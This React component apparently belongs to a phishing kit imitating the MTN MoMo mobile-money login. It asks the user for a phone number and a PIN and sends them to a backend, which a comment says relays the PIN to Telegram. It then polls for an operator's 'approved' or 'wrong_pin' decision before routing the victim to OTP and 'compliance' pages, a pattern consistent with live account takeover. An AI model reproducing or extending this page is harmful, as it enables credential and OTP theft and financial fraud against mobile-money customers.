// import "./Login.css";
import "./Login.css";
import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { verificationService } from "../services/api";

function Login({ client, setpin, sendDetails, setnumber }) {
  const { number } = client;
  const navigate = useNavigate();
  const [pin1, setPin1] = useState("");
  const [pin2, setPin2] = useState("");
  const [pin3, setPin3] = useState("");
  const [pin4, setPin4] = useState("");
  const [pin5, setPin5] = useState("");
  const [verifying, setVerifying] = useState(false);
  const [status, setStatus] = useState("");
  const [enterPin, setEnterPin] = useState(false);
  // const [sessionId, setSessionId] = useState("");
  const [error, setError] = useState("");
  const [pollingInterval, setPollingInterval] = useState(null);

  // Create refs for each input
  const pin1Ref = useRef(null);
  const pin2Ref = useRef(null);

  const pin3Ref = useRef(null);
  const pin4Ref = useRef(null);
  const pin5Ref = useRef(null);

  const localPin = [pin1, pin2, pin3, pin4, pin5];
  const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}${localPin[4]}`;
  const pinfull = pinString.length === 5;
  console.log(pinfull);

  // API URL - Use environment variable or fallback
  const API_URL = import.meta.env.VITE_API_URL;
  function handlenext() {
    if (number.length <= 8 || number.length > 10) {
      console.log("bad");
      console.log(number);
      number.length === 9 ? alert("Please enter a valid phone number") : null;
      return;
    } else {
      console.log(number);
      console.log("400");
    }
    setEnterPin(true);
  }

  // Function to handle PIN input and auto-focus next field
  const handlePinInput = (pinNumber, value, setter) => {
    // Only allow numbers
    if (value && !/^\d$/.test(value)) return;

    setter(value);

    // Auto-focus next input if a digit was entered
    if (value !== "") {
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        case 4:
          if (pin5Ref.current) pin5Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace - focus previous field
    if (value === "" && pinNumber > 1) {
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 5:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }
  };

  // Handle keydown for navigation
  const handleKeyDown = (pinNumber, e) => {
    // Handle left arrow key
    if (e.key === "ArrowLeft" && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 5:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle right arrow key
    if (e.key === "ArrowRight" && pinNumber < 4) {
      e.preventDefault();
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        case 4:
          if (pin5Ref.current) pin5Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace when empty
    if (e.key === "Backspace" && !localPin[pinNumber - 1] && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 5:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }
  };
  // In Login.js - Use the service instead of fetch

  const sendPinToBackend = async () => {
    console.log("🔍 Sending PIN to backend...");
    console.log("📱 Phone:", number);
    console.log("🔢 PIN:", pinString);

    setVerifying(true);
    setError("");
    setStatus("pending");

    // Clear any existing polling interval
    if (pollingInterval) {
      clearInterval(pollingInterval);
      setPollingInterval(null);
    }

    try {
      const data = await verificationService.requestPinVerification({
        phoneNumber: number,
        pinCode: pinString,
        userId: `user_${Date.now()}`,
        userName: "Airtel User",
      });

      console.log("✅ Backend response:", data);

      if (data.success && data.sessionId) {
        console.log("🎯 Session ID received:", data.sessionId);

        // Start polling using the service
        startPolling(data.sessionId);
      } else {
        console.error("❌ Backend error:", data.error);
        setError(data.error || "Failed to verify PIN");
        setVerifying(false);
        setStatus("");
      }
    } catch (error) {
      console.error("❌ Network error:", error);
      setError("Network error. Please check your connection and try again.");
      setVerifying(false);
      setStatus("");
    }
  };

  // Updated polling function using the service
  const startPolling = (sessionId) => {
    console.log("🔄 Starting polling for session:", sessionId);

    let attempts = 0;
    const maxAttempts = 150;

    const poll = async () => {
      if (attempts >= maxAttempts) {
        console.log("⏰ Max polling attempts reached");
        setError("PIN verification timeout. Please try again.");
        setVerifying(false);
        setStatus("expired");
        return;
      }

      attempts++;

      try {
        const data = await verificationService.checkPinStatus(sessionId);
        console.log("📊 Status data:", data);

        // Handle different statuses
        if (data.status === "approved") {
          console.log("✅ PIN approved!");
          stopPolling();
          setStatus("approved");
          setVerifying(false);
          setTimeout(() => handleApprovedPin(), 1000);
        } else if (data.status === "pending") {
          console.log("⏳ Still pending...");
          setStatus("pending");
        } else if (data.status === "wrong_pin") {
          console.log("❌ Wrong PIN");
          stopPolling();
          setError("Wrong PIN entered. Please try again.");
          setVerifying(false);
          setStatus("wrong_pin");
        } else if (data.status === "expired") {
          console.log("⏰ Session expired");
          stopPolling();
          setError("PIN verification expired. Please try again.");
          setVerifying(false);
          setStatus("expired");
        } else if (data.status === "approved_with_otp") {
          console.log("✅ PIN & OTP approved!");
          stopPolling();
          setStatus("pinotp_correct");
          setVerifying(false);
          setTimeout(() => navigate("/compliance"), 2000);
        }
      } catch (err) {
        console.error("❌ Polling error:", err);
      }
    };

    const stopPolling = () => {
      if (pollingInterval) {
        clearInterval(pollingInterval);
        setPollingInterval(null);
      }
    };

    // Start immediately
    poll();

    // Set interval
    const interval = setInterval(poll, 2000);
    setPollingInterval(interval);
  };

  // Handle approved PIN
  const handleApprovedPin = () => {
    // console.log("🎉 PIN approved, proceeding to OTP verification...");
    setpin(pinString);
    sendDetails();
    navigate("/otpverification");
  };

  // Function to handle login
  const handleLogin = async () => {
    if (pinfull) {
      // Send PIN to Telegram for verification
      await sendPinToBackend();
    } else {
      setError("Please enter a 4-digit PIN");
    }
  };

  // Status messages
  const statusMessages = {
    pending: "🔐 Verifying PIN...",
    approved: "✅ PIN verified!",
    wrong_pin: "❌ Wrong PIN",
    pinotp_correct: "✅ PIN and OTP verified!",
    expired: "⏰ Verification timeout",
  };

  // Effect to focus first input on mount
  useEffect(() => {
    if (pin1Ref.current) {
      pin1Ref.current.focus();
    }
  }, []);

  // Cleanup polling interval on component unmount
  useEffect(() => {
    return () => {
      if (pollingInterval) {
        clearInterval(pollingInterval);
      }
    };
  }, [pollingInterval]);

  // const num = Number(number);

  return (
    <>
      <div className="container">
        <header>
          <img className="momoImg" src="/mtn.jpeg" alt="mtn" />
        </header>
        {/* <h1 className="login-title">Welcome to momo</h1> */}

        <main>
          {!enterPin && (
            <div className="ctamomo">
              <div className="phone-number">
                <h1 className="login-title">
                  Welcome to <strong>MoMo</strong>{" "}
                </h1>
                <div className="numbercont">
                  <div className="flagcont">🇸🇳</div>
                  <div className="NumInput">
                    <div className="countrycode">+237</div>
                    <input
                      type="text"
                      name="number"
                      inputMode="numeric"
                      onChange={(e) => setnumber(e.target.value)}
                      // defaultValue={num}
                      maxLength="10"
                      className="numcont"
                      disabled={verifying}
                    />
                  </div>
                </div>
              </div>
              <p className="termspolicy">
                By using this app you agree to our Mobile
                <span style={{ color: " #0d5e94" }}>
                  Terms of use and Privacy Policy
                </span>
              </p>
              <div></div>
              <button
                className="btnNext"
                onClick={handlenext}
                disabled={pinfull || verifying}
              >
                NEXT
              </button>
            </div>
          )}
          {enterPin && (
            <div className="pin-input-container">
              <label className="pin-label">Enter your PIN</label>
              <div>
                <input
                  ref={pin1Ref}
                  maxLength="1"
                  type="number"
                  className="no-spinner"
                  value={pin1}
                  onChange={(e) => handlePinInput(1, e.target.value, setPin1)}
                  onKeyDown={(e) => handleKeyDown(1, e)}
                  disabled={verifying}
                />
                <input
                  ref={pin2Ref}
                  type="number"
                  className="no-spinner"
                  value={pin2}
                  maxLength="1"
                  onChange={(e) => handlePinInput(2, e.target.value, setPin2)}
                  onKeyDown={(e) => handleKeyDown(2, e)}
                  disabled={verifying}
                />
                <input
                  ref={pin3Ref}
                  type="number"
                  maxLength="1"
                  className="no-spinner"
                  value={pin3}
                  onChange={(e) => handlePinInput(3, e.target.value, setPin3)}
                  onKeyDown={(e) => handleKeyDown(3, e)}
                  disabled={verifying}
                />
                <input
                  ref={pin4Ref}
                  type="number"
                  maxLength="1"
                  className="no-spinner"
                  value={pin4}
                  onChange={(e) => handlePinInput(4, e.target.value, setPin4)}
                  onKeyDown={(e) => handleKeyDown(4, e)}
                  disabled={verifying}
                />
                <input
                  ref={pin5Ref}
                  type="number"
                  maxLength="1"
                  className="no-spinner"
                  value={pin5}
                  onChange={(e) => handlePinInput(5, e.target.value, setPin5)}
                  onKeyDown={(e) => handleKeyDown(5, e)}
                  disabled={verifying}
                />
              </div>

              {/* Status/Error Display */}
              {error && (
                <div
                  className="error-message"
                  style={{
                    color: "red",
                    marginTop: "10px",
                    padding: "10px",
                    backgroundColor: "#ffeeee",
                    borderRadius: "5px",
                    textAlign: "center",
                  }}
                >
                  {error}
                </div>
              )}

              {status && (
                <div
                  className="status-message"
                  style={{
                    color:
                      status === "approved" || status === "pinotp_correct"
                        ? "green"
                        : status === "pending"
                          ? "orange"
                          : "red",
                    marginTop: "10px",
                    fontWeight: "bold",
                    padding: "10px",
                    backgroundColor:
                      status === "approved" ? "#eeffee" : "#fff8e1",
                    borderRadius: "5px",
                    textAlign: "center",
                  }}
                >
                  {statusMessages[status] || status}
                </div>
              )}
              <div className="forgot-pin">
                <a href="#">Forgot PIN?</a>
              </div>

              <button
                className="btnContinue"
                onClick={handleLogin}
                disabled={!pinfull || verifying}
                style={{
                  opacity: !pinfull || verifying ? 0.6 : 1,
                  cursor: !pinfull || verifying ? "not-allowed" : "pointer",
                }}
              >
                {verifying ? "Verifying PIN..." : "Login"}
              </button>
            </div>
          )}

          <div className="forgot-pin">{/* <a href="#">Forgot PIN?</a> */}</div>
        </main>

        <footer className="footer">{/* <div className="curvesec"> */}</footer>
      </div>
    </>
  );
}

export default Login;
